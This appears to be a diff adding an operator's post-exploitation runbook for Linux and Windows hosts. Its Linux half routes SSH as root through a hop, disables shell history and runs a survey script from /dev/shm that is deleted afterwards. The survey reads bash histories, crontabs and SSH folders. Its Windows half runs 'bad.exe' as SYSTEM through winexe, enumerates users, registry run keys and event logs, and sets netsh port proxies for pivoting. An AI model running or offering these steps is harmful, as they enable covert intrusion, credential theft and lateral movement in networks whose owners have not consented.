@@ -1,0 +1,122 @@
+===============
+-- Linux Box
+===============
+script termscreen.$$
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-1 root@1.1.1.1
+ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
+
+unset HISTFILE HISTFILESIZE HISTSIZE 
+export LESSHISTFILE=/dev/null
+scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/survey.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm -f /dev/shm/.a
+
+Ran the following mando commands in script survey.sh
+date; date -u
+ps -elf
+netstat -natup || ss -natup
+ifconfig || ip a
+w
+uname -a
+df -h
+ls -latr /
+ls -latr /tmp
+ls -latr .
+ls -latr ..
+ls -latr /root
+ls -latr /var/log
+find / -type f -mmin -20 | egrep -v '\/sys|\/proc'
+cat /root/.bash_history
+cat /home/*/.bash_history
+cat /root/.viminfo
+cat /home/*/.viminfo
+
+
+
+Ran the following commands in survey.sh script
+cat /etc/*syslog*
+lsmod
+cat /etc/*release*
+servcie --status-all || systemctl status --no-pager
+for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -d \: -f1); do crontab -u $user -l; done
+cat /etc/crontab
+cat /proc/cpuinfo
+ls -la /etc/cron.*
+ip nei || arp -vn
+route -n
+mount
+cat /etc/rc.local
+if [[ $(lsmod | grep -i table) ]]; then eval "iptables -L"; else echo "No IPTables"; fi
+echo ""
+ls -latr /root/.ssh
+ls -latr /home/*/.ssh
+
+
+Ran the following exit commands in script survey.sh
+ps -elf
+netstat -lptn
+find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
+ls -latr /dev/shm
+ls -latr /tmp
+ls -latr /var/log
+ssh -S /tmp/hop-1 -O exit root@1.1.1.1
+
+
+ 
+===============
+--Windows Box
+===============
+
+script termscreen.$$
+
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
+winexe -U domain.name/username //ip c:\\windows\\bad.exe --system
+
+date /t && time /t
+tasklist /V
+wmic process get commandline, processid, parentprocessid /format:list
+netstat -anob
+netsh advfirewall show allprofiles
+net share
+reg query hklm\software\microsoft\windows\currentversion\run
+reg query hklm\software\microsoft\windows\currentversion\runonce
+reg query hklm\software
+reg query hklm\software\wow6432node
+at
+schtasks /query /v /fo list
+dir /o:d /t:w c:\
+dir /o:d /t:w c:\windows\temp
+dir /o:d /t:w c:\windows\
+dir /o:d /t:w c:\windows\system32
+dir /o:d /t:w c:\windows\system32\winevt\logs
+Wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+auditpol /get /category:*
+ipconfig /all
+
+Systeminfo
+Net user
+Net localgroup
+Net session
+Net start
+Type %systemroot%\system32\drivers\etc\hosts
+Arp -a
+Route print
+
+
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
+
+netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.106.0.9 connectport=445 connectaddress=10.106.0.10 protocol=tcp
+netsh interface portproxy show all
+
+netsh interface portproxy delete v4tov4 listenport=<> listenaddress=192.168.1.111
+dir /o:d /t:w c:\windows\temp
+dir /o:d /t:w c:\windows\system32\winevt\logs
+Wevtutil qe security /c:25 /rd:true /f:text         #whatever has updated from previous dir
+netstat /anob
+tasklist
+
+
+
+
+
